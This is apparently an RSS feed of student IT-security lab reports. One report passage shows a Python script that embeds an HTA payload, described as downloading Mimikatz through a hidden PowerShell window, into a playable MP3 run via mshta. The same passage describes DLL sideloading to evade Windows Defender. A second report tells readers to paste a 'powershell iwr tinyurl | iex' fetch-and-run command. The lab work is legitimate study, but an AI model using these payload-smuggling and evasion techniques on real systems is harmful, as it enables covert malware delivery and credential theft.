<p>There are two notable types of forged Kerberos tickets: Silver and Golden tickets. <!-- raw HTML omitted -->Medium<sup id="fnref1:11"><a href="#fn:11" class="footnote-ref" role="doc-noteref">11</a></sup><!-- raw HTML omitted --> <!-- raw HTML omitted -->MITRE ATT&amp;CK<sup id="fnref1:13"><a href="#fn:13" class="footnote-ref" role="doc-noteref">13</a></sup><!-- raw HTML omitted --></p>
<h4 id="how-to-use-mimikatz">How to Use Mimikatz</h4>
<p>There are multiple ways to invoke Mimikatz on a target system. The simplest method is to download a compiled release from the official GitHub repository. However, there are also pre-built PowerShell scripts and commands that streamline its execution, such as Invoke-Mimikatz from the PowerSploit framework. <!-- raw HTML omitted -->PowerSploit<sup id="fnref:14"><a href="#fn:14" class="footnote-ref" role="doc-noteref">14</a></sup><!-- raw HTML omitted --></p>
<hr>
<h3 id="running-mimikatz">Running Mimikatz</h3>
<p>To run Mimikatz on the target system, I wanted to try a unique or more creative method rather than simply downloading and executing the Mimikatz binary directly. Inspired by a video from security professional and YouTuber John Hammond, where he analyzes a malware sample hidden inside an MP3 file that uses mshta.exe to execute a payload, I explored a similar idea. <!-- raw HTML omitted -->John Hammond<sup id="fnref:15"><a href="#fn:15" class="footnote-ref" role="doc-noteref">15</a></sup><!-- raw HTML omitted --></p>
<p>To do this, I used an MP3 file in which I embedded the plain text of an HTA script that downloads Mimikatz. The MP3 file appears normal and can be played, but if executed using <code>mshta</code>, it executes the script.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/payload.png"/> <figcaption>
            Figure 27: Showing the payload in the mp3 file
        </figcaption>
</figure>

<p>The payload runs a PowerShell command in a hidden window that downloads Mimikatz and saves it as <code>msedge_installer.zip</code>.</p>
<p>To insert my payload into an MP3 file, I wrote the following Python script:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">insert_file</span>(target_path, payload_path, output_path):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(target_path, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> target_file:
</span></span><span style="display:flex;"><span>            target_content <span style="color:#f92672">=</span> target_file<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(payload_path, <span style="color:#e6db74">&#39;rb&#39;</span>) <span style="color:#66d9ef">as</span> payload_content:
</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> payload_content<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>        target_size <span style="color:#f92672">=</span> len(target_content)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> target_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;Error: Target file is empty.&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>        middle_index <span style="color:#f92672">=</span> target_size <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>        random_offset_range <span style="color:#f92672">=</span> target_size <span style="color:#f92672">//</span> <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>        random_offset <span style="color:#f92672">=</span> random<span style="color:#f92672">.</span>randint(<span style="color:#f92672">-</span>random_offset_range, random_offset_range)
</span></span><span style="display:flex;"><span>        insertion_point <span style="color:#f92672">=</span> max(<span style="color:#ae81ff">0</span>, min(target_size, middle_index <span style="color:#f92672">+</span> random_offset))
</span></span><span style="display:flex;"><span>        new_content <span style="color:#f92672">=</span> target_content[:insertion_point] <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> target_content[insertion_point:]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(output_path, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> output_file:
</span></span><span style="display:flex;"><span>            output_file<span style="color:#f92672">.</span>write(new_content)
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;File &#39;</span><span style="color:#e6db74">{</span>payload_path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; inserted at position </span><span style="color:#e6db74">{</span>insertion_point<span style="color:#e6db74">}</span><span style="color:#e6db74"> in &#39;</span><span style="color:#e6db74">{</span>target_path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; and saved as &#39;</span><span style="color:#e6db74">{</span>output_path<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;.&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">FileNotFoundError</span>:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;Error: One or both of the input files were not found.&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;An error occurred: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    target_mp3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./The_link_orginal.mp3&#34;</span>
</span></span><span style="display:flex;"><span>    file_to_insert <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;payload.hta&#34;</span>
</span></span><span style="display:flex;"><span>    output_mp3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./The_link.mp3&#34;</span>
</span></span><span style="display:flex;"><span>    insert_file(target_mp3, file_to_insert, output_mp3)
</span></span></code></pre></div><p>Figures below show the properties of the edited file, its ability to be played back, and the execution of the file via <code>mshta</code> on the target user through RDP.</p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/link_properties.png"/> <figcaption>
            Figure 28: Showing the properties of the mp3 file
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/listentiogn%20to%20the%20mp3%20file.png"/> <figcaption>
            Figure 29: Listening to the mp3 file
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/exepayload.png"/> <figcaption>
            Figure 30: Executing the payload inside the mp3 file
        </figcaption>
</figure>
</p>
<p>The ZIP file can now be extracted, and Mimikatz can be executed. However, since the user has virtually no permissions—and Mimikatz requires elevated privileges—it had no practical use in this scenario.</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/sadgemimikatz.png"/> <figcaption>
            Figure 31: Running privilege::debug in mimikatz
        </figcaption>
</figure>

<hr>
<h4 id="dll-side-loading-to-attempt-to-bypass-windows-defender">DLL Side-Loading to Attempt to Bypass Windows Defender</h4>
<p>DLL sideloading is a technique in which a built-in Windows binary is copied to a different path, and a custom-compiled DLL is placed in the same directory, hoping that the binary will load the malicious DLL instead of the intended one. To find such vulnerable binaries, there is a website called hijacklibs.net, which allows filtering DLLs by vendor and provides detection rules for each specific DLL. <!-- raw HTML omitted -->HijackLibs<sup id="fnref:16"><a href="#fn:16" class="footnote-ref" role="doc-noteref">16</a></sup><!-- raw HTML omitted --></p>
<p>To create your own DLL, you need the Microsoft x64 Native Developer Tools. You can then write the code for your DLL and compile it using:</p>
<pre tabindex="0"><code>cl /LD DismCore.c user32.lib 
</code></pre><p>I tried bundling Mimikatz into the DLL and sideloading it via a built-in Windows executable in an attempt to bypass Windows Defender. However, it was detected anyway.</p>
<p><figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/dll-1.png"/> <figcaption>
            Figure 32: Opening a Messagebox with the dll
        </figcaption>
</figure>

<figure>
    <img loading="lazy" src="/itsi/y3/ex9/images/dll-2.png"/> <figcaption>
            Figure 33: Trying to run the script via the dll
        </figcaption>
</figure>
</p>
<hr>
<h4 id="how-to-detect-and-block-mimikatz">How to Detect and Block Mimikatz</h4>
<p>There are a multitude of ways to prevent Mimikatz, most of which come down to restricting access. For example, configuring the &ldquo;Debug Program&rdquo; policy to be accessible only to local administrators, disabling outdated protocols such as <code>WDigest</code>, and enforcing strong password policies.</p>
<hr>
<h2 id="references">References</h2>
<p><em>For a full bibliography, see the <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex9/zotero.bib">original BibTeX file</a>.</em></p>
<div class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1">
<p>Microsoft Corporation. Server Message Block (SMB) Protocol Versions 2 and 3. <a href="https://winprotocoldoc.z19.web.core.windows.net/MS-SMB2/%5bMS-SMB2%5d.pdf">source</a>&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a>&#160;<a href="#fnref1:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2">
<p>Microsoft Community Hub. Controlling SMB Dialects. <a href="https://techcommunity.microsoft.com/blog/filecab/controlling-smb-dialects/860024">source</a>&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3">
<p>Wikipedia. NTLMSSP. <a href="https://en.wikipedia.org/w/index.php?title=NTLMSSP&amp;oldid=990800521">source</a>&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a>&#160;<a href="#fnref1:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4">
<p>Microsoft Docs. [MS-SMB2]: SMB2 SESSION_SETUP Request. <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/5a3c2c28-d6b0-48ed-b917-a86b2ca4575f">source</a>&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:5">
<p>Windows OS Hub. Managing Administrative Shares (Admin$, IPC$, C$) on Windows. <a href="https://woshub.com/enable-remote-access-to-admin-shares-in-workgroup/">source</a>&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:6">
<p>Wikipedia. Remote Desktop Protocol. <a href="https://en.wikipedia.org/w/index.php?title=Remote_Desktop_Protocol&amp;oldid=1245904842">source</a>&#160;<a href="#fnref:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a>&#160;<a href="#fnref1:6" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:7">
<p>Microsoft Docs. Credential Security Support Provider - Win32 apps. <a href="https://learn.microsoft.com/en-us/windows/win32/secauthn/credential-security-support-provider">source</a>&#160;<a href="#fnref:7" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:8">
<p>GitHub. devnulli/EvlWatcher: a &ldquo;fail2ban&rdquo; style modular log file analyzer for windows. <a href="https://github.com/devnulli/EvlWatcher">source</a>&#160;<a href="#fnref:8" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:9">
<p>Windows OS Hub. Disable NTLM Authentication in Windows. <a href="https://woshub.com/disable-ntlm-authentication-windows">source</a>&#160;<a href="#fnref:9" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:10">
<p>The Windows Club. How to restrict the number of Login attempts in Windows 11/10. <a href="https://www.thewindowsclub.com/how-to-restrict-the-number-of-login-attempts-in-windows-7">source</a>&#160;<a href="#fnref:10" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:11">
<p>Medium. Detailed mimikatz guide. <a href="https://medium.com/@redfanatic7/detailed-mimikatz-guide-87176fd526c0">source</a>&#160;<a href="#fnref:11" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a>&#160;<a href="#fnref1:11" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:12">
<p>CrowdStrike. What is a Pass-the-Hash Attack? <a href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/pass-the-hash-attack">source</a>&#160;<a href="#fnref:12" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:13">
<p>MITRE ATT&amp;CK. Use Alternate Authentication Material: Pass the Ticket. <a href="https://attack.mitre.org/techniques/T1550/003">source</a>&#160;<a href="#fnref:13" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a>&#160;<a href="#fnref1:13" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:14">
<p>PowerSploit. PowerShellMafia/PowerSploit. <a href="https://github.com/PowerShellMafia/PowerSploit">source</a>&#160;<a href="#fnref:14" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:15">
<p>John Hammond. this MP3 file is malware. <a href="https://www.youtube.com/watch?v=25NvCdFSkA4">source</a>&#160;<a href="#fnref:15" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:16">
<p>HijackLibs. dismcore.dll on HijackLibs. <a href="https://hijacklibs.net/entries/microsoft/built-in/dismcore.html">source</a>&#160;<a href="#fnref:16" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</div>
]]></content:encoded>
    </item>
    <item>
      <title>Secure data storrage on Windows Server</title>
      <link>http://localhost:1313/posts/itsi/year-3/exercise-8/secure-data-storrage-on-windows-server/</link>
      <pubDate>Fri, 14 Mar 2025 02:22:09 +0100</pubDate>
      <guid>http://localhost:1313/posts/itsi/year-3/exercise-8/secure-data-storrage-on-windows-server/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;Note: this was converted from LaTeX to Markdown using ChatGPT 4.1. The original PDF can be found &lt;a href=&#34;https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex8/Sichere%20Datenspeicherung%20unter%20Windows.pdf&#34;&gt;here&lt;/a&gt; along with the &lt;a href=&#34;https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex8/quellen.bib&#34;&gt;bibliography&lt;/a&gt;.&lt;/p&gt;&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h1 id=&#34;secure-data-storage-on-windows&#34;&gt;Secure data storage on Windows&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Laboratory protocol&lt;/strong&gt;&lt;br&gt;
Exercise 8: Secure data storage on Windows&lt;br&gt;
&lt;figure&gt;
    &lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/itsi/y3/ex8/images/menAAA.png&#34;/&gt; &lt;figcaption&gt;
            Figure: Grouplogo
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;strong&gt;Subject:&lt;/strong&gt; ITSI&lt;br&gt;
&lt;strong&gt;Class:&lt;/strong&gt; 3AHITN&lt;br&gt;
&lt;strong&gt;Name:&lt;/strong&gt; Stefan Fürst, Justin Tremurici&lt;br&gt;
&lt;strong&gt;Group Name/Number:&lt;/strong&gt; todo/12&lt;br&gt;
&lt;strong&gt;Supervisor:&lt;/strong&gt; SPAC, ZIVK&lt;br&gt;
&lt;strong&gt;Exercise dates:&lt;/strong&gt; 14.02.2025 | 21.02.2025 | 28.02.2025 | 7.02.2025&lt;br&gt;
&lt;strong&gt;Submission date:&lt;/strong&gt; 14.3.2025&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;table-of-contents&#34;&gt;Table of Contents&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#task-definition&#34;&gt;Task definition&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#task-overview&#34;&gt;Task Overview&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#summary&#34;&gt;Summary&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#exercise-execution&#34;&gt;Exercise Execution&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#introduction&#34;&gt;Introduction&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#explaining-the-first-script&#34;&gt;Explaining the first script&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#changing-the-execution-policy&#34;&gt;Changing the execution policy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#installing-bitlocker&#34;&gt;Installing BitLocker&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#changing-the-hostname&#34;&gt;Changing the Hostname&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#downloading-the-second-script&#34;&gt;Downloading the second script&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#enabling-remote-desktop&#34;&gt;Enabling Remote Desktop&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#creating-a-scheduled-task&#34;&gt;Creating a Scheduled Task&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#the-second-script&#34;&gt;The second script&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#creating-users-and-adding-them-to-groups&#34;&gt;Creating Users and Adding Them to Groups&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#resizing-the-disk-and-creating-a-new-partition&#34;&gt;Resizing the Disk and Creating a New Partition&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#creating-directories&#34;&gt;Creating Directories&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#populating-the-directories&#34;&gt;Populating the Directories&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#creating-users-and-groups&#34;&gt;Creating Users and Groups&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#verifying-the-creation-of-users-and-groups&#34;&gt;Verifying the Creation of users and groups&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#managing-ntfs-permissions-using-icacls&#34;&gt;Managing NTFS Permissions Using icacls&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#sharing-the-directories-via-smb&#34;&gt;Sharing the Directories via SMB&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#encrypting-the-volume-using-bitlocker&#34;&gt;Encrypting the Volume using BitLocker&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#references&#34;&gt;References&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;task-definition&#34;&gt;Task definition&lt;/h2&gt;
&lt;h3 id=&#34;task-overview&#34;&gt;Task Overview&lt;/h3&gt;
&lt;p&gt;The goal of this exercise is to set up a secure and structured data storage system on a Windows Server, ensuring proper access control and encryption. The tasks include installing the operating system, configuring users and groups, setting up a folder structure, and securing access with permissions.&lt;/p&gt;</description>
      <content:encoded><![CDATA[<blockquote>
<p>Note: this was converted from LaTeX to Markdown using ChatGPT 4.1. The original PDF can be found <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex8/Sichere%20Datenspeicherung%20unter%20Windows.pdf">here</a> along with the <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex8/quellen.bib">bibliography</a>.</p></blockquote>
<hr>
<h1 id="secure-data-storage-on-windows">Secure data storage on Windows</h1>
<hr>
<p><strong>Laboratory protocol</strong><br>
Exercise 8: Secure data storage on Windows<br>
<figure>
    <img loading="lazy" src="/itsi/y3/ex8/images/menAAA.png"/> <figcaption>
            Figure: Grouplogo
        </figcaption>
</figure>

<strong>Subject:</strong> ITSI<br>
<strong>Class:</strong> 3AHITN<br>
<strong>Name:</strong> Stefan Fürst, Justin Tremurici<br>
<strong>Group Name/Number:</strong> todo/12<br>
<strong>Supervisor:</strong> SPAC, ZIVK<br>
<strong>Exercise dates:</strong> 14.02.2025 | 21.02.2025 | 28.02.2025 | 7.02.2025<br>
<strong>Submission date:</strong> 14.3.2025</p>
<hr>
<h2 id="table-of-contents">Table of Contents</h2>
<ul>
<li><a href="#task-definition">Task definition</a>
<ul>
<li><a href="#task-overview">Task Overview</a></li>
</ul>
</li>
<li><a href="#summary">Summary</a></li>
<li><a href="#exercise-execution">Exercise Execution</a>
<ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#explaining-the-first-script">Explaining the first script</a>
<ul>
<li><a href="#changing-the-execution-policy">Changing the execution policy</a></li>
<li><a href="#installing-bitlocker">Installing BitLocker</a></li>
<li><a href="#changing-the-hostname">Changing the Hostname</a></li>
<li><a href="#downloading-the-second-script">Downloading the second script</a></li>
<li><a href="#enabling-remote-desktop">Enabling Remote Desktop</a></li>
<li><a href="#creating-a-scheduled-task">Creating a Scheduled Task</a></li>
</ul>
</li>
<li><a href="#the-second-script">The second script</a>
<ul>
<li><a href="#creating-users-and-adding-them-to-groups">Creating Users and Adding Them to Groups</a></li>
<li><a href="#resizing-the-disk-and-creating-a-new-partition">Resizing the Disk and Creating a New Partition</a></li>
<li><a href="#creating-directories">Creating Directories</a></li>
<li><a href="#populating-the-directories">Populating the Directories</a></li>
<li><a href="#creating-users-and-groups">Creating Users and Groups</a></li>
<li><a href="#verifying-the-creation-of-users-and-groups">Verifying the Creation of users and groups</a></li>
<li><a href="#managing-ntfs-permissions-using-icacls">Managing NTFS Permissions Using icacls</a></li>
<li><a href="#sharing-the-directories-via-smb">Sharing the Directories via SMB</a></li>
<li><a href="#encrypting-the-volume-using-bitlocker">Encrypting the Volume using BitLocker</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
<hr>
<h2 id="task-definition">Task definition</h2>
<h3 id="task-overview">Task Overview</h3>
<p>The goal of this exercise is to set up a secure and structured data storage system on a Windows Server, ensuring proper access control and encryption. The tasks include installing the operating system, configuring users and groups, setting up a folder structure, and securing access with permissions.</p>
<p>First, <code>Windows Server 2019</code> or newer must be installed in a virtualized environment, with the <code>hostname</code> and user accounts configured according to a naming convention. A structured folder system should be created based on an assigned fictional company, categorizing data logically and including sample files.</p>
<p>User management involves defining necessary accounts, organizing them into <code>organizational groups</code>, and enforcing a consistent naming scheme. Permissions must be applied using <code>NTFS</code> security settings, restricting access appropriately. <code>Network shares</code> need to be configured to allow remote access while maintaining security through controlled sharing settings.</p>
<p>The storage system must be optimized by creating a new <code>partition</code>, migrating data, and applying <code>BitLocker</code> encryption. All configurations should be verified, and documentation is required throughout the process. <code>PowerShell</code> automation is encouraged where applicable.<!-- raw HTML omitted -->ChatGPT<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup><!-- raw HTML omitted --></p>
<hr>
<h2 id="summary">Summary</h2>
<p>This task was fully automated using two <code>PowerShell</code> scripts. The first script set up the environment by configuring the necessary system settings and creating a <code>Scheduled Task</code> using <code>New-ScheduledTask</code> and <code>Register-ScheduledTask</code> to execute the second script at predefined intervals. The second script performed all required operations, including creating and managing <code>users</code>, <code>directories</code>, <code>files</code>, and their <code>permissions</code>.</p>
<p>To manage users, the script utilized commands such as <code>New-LocalUser</code> to create users, <code>Add-LocalGroupMember</code> to assign them to groups, and <code>Set-LocalUser</code> to modify user settings. The script dynamically generated random user accounts and assigned them to groups based on predefined logic. Organizational groups and security groups were structured to align with the fictional company scenario, BuildSmart BIM, a digital building company specializing in architecture, material lists, and time plans.</p>
<p>For managing directories and files, commands like <code>New-Item</code> were used to create directory structures, and <code>icacls</code> was used to configure <code>NTFS permissions</code> for securing access.</p>
<p>The partitioning of the drive was accomplished using <code>Resize-Partition</code> to shrink the primary partition and <code>New-Partition</code> to create a new <code>B:</code> partition, followed by <code>Format-Volume</code> to prepare it for use. The existing directory structure was then migrated using <code>Move-Item</code>.</p>
<p>To enable file sharing, <code>New-SmbShare</code> was employed to create network shares. Additionally, the script encrypted the partition using <code>Enable-BitLocker</code>.</p>
<p>Through this approach, the entire process was streamlined and executed automatically, significantly reducing manual effort while maintaining a structured and secure environment.</p>
<hr>
<h2 id="exercise-execution">Exercise Execution</h2>
<h3 id="introduction">Introduction</h3>
<p>This entire exercise was automated with a script that can be invoked with a single command. It is designed to be used after setting up a fresh install of a new version of Windows Server. This script will complete the entire exercise automatically.</p>
<p><strong>Note:</strong> For the script to work, the language of the Windows Server installation must be set to English, since user and group names are localized with no available aliases.<!-- raw HTML omitted -->Nico Boehr<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup><!-- raw HTML omitted --></p>
<p>To run it, simply log into the Administrator account, press <strong>Windows + R</strong> to open the Run dialog, and paste the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell.exe iwr https<span style="color:#960050;background-color:#1e0010">:</span>//tinyurl.com/mr234bdr | iex
</span></span></code></pre></div><p>This runs <code>powershell.exe</code> and uses the abbreviation <code>iwr</code>, which stands for <code>Invoke-WebRequest</code>. This command makes a web request to the given link, which in this case is <a href="https://tinyurl.com/mr234bdr">https://tinyurl.com/mr234bdr</a>. This URL redirects to the raw file from my GitHub repository, where the first of two PowerShell scripts is downloaded.<!-- raw HTML omitted -->Invoke-WebRequest<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup><!-- raw HTML omitted --></p>
<p><strong>Important:</strong> Whenever you run a command like this, always open the URL in your web browser first to verify its contents. Check whether the script has any red flags, such as obfuscation or suspicious behavior that it is not intended to perform.</p>
<p>The downloaded script is then piped into <code>iex</code>, which is short for <code>Invoke-Expression</code>. This executes the output from <code>stdin</code>, which, in this case, is the contents of the script.<!-- raw HTML omitted -->Abbreviation Table<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup><!-- raw HTML omitted --><!-- raw HTML omitted -->Invoke-Expression<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup><!-- raw HTML omitted --></p>
<hr>
<h4 id="explaining-the-first-script">Explaining the first script</h4>
<h5 id="changing-the-execution-policy">Changing the execution policy</h5>
<p>The first line of the <code>setup.ps1</code> script is:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Set-ExecutionPolicy RemoteSigned -Scope LocalMachine -Force
</span></span></code></pre></div><p>This sets the <code>ExecutionPolicy</code> parameter to the <code>RemoteSigned</code> policy. The <code>Scope</code> parameter specifies the default scope value in this command as <code>LocalMachine</code>. The <code>-Force</code> parameter is used to suppress all confirmation prompts. So that the second script that is downloaded in this script is allowed to run on this device.<!-- raw HTML omitted -->Set-ExecutionPolicy<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup><!-- raw HTML omitted --></p>
<p>This can be verified by running the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Get-ExecutionPolicy -List
</span></span></code></pre></div><figure>
    <img loading="lazy" src="/itsi/y3/ex8/images/expolicy.png"/> <figcaption>
            Figure 1: Listing the execution policies of the local machine
        </figcaption>
</figure>

<hr>
<h5 id="installing-bitlocker">Installing BitLocker</h5>
<p><code>Install-WindowsFeature BitLocker</code> installs the Windows feature BitLocker, which is used for drive encryption and will be needed later in the exercise. It is included in the setup because its installation requires a reboot.<!-- raw HTML omitted -->Install-WindowsFeature<sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup><!-- raw HTML omitted --><!-- raw HTML omitted -->BitLocker<sup id="fnref:8"><a href="#fn:8" class="footnote-ref" role="doc-noteref">8</a></sup><!-- raw HTML omitted --></p>
<hr>
<h5 id="changing-the-hostname">Changing the Hostname</h5>
<p><code>Rename-Computer -NewName &quot;fus-win-12&quot; -Force</code> changes the hostname of the computer to <code>fus-win-12</code>. The <code>-Force</code> parameter ensures the command runs non-interactively. This requires a reboot as well and is therefore included in the setup script.<!-- raw HTML omitted -->rename-computer<sup id="fnref:9"><a href="#fn:9" class="footnote-ref" role="doc-noteref">9</a></sup><!-- raw HTML omitted --></p>
<p>The change of the hostname can be verified by using the <code>hostname</code> command:</p>
<figure>
    <img loading="lazy" src="/itsi/y3/ex8/images/hostname.png"/> <figcaption>
            Figure 2: Verifying the hostname change
        </figcaption>
</figure>

<hr>
<h5 id="downloading-the-second-script">Downloading the second script</h5>
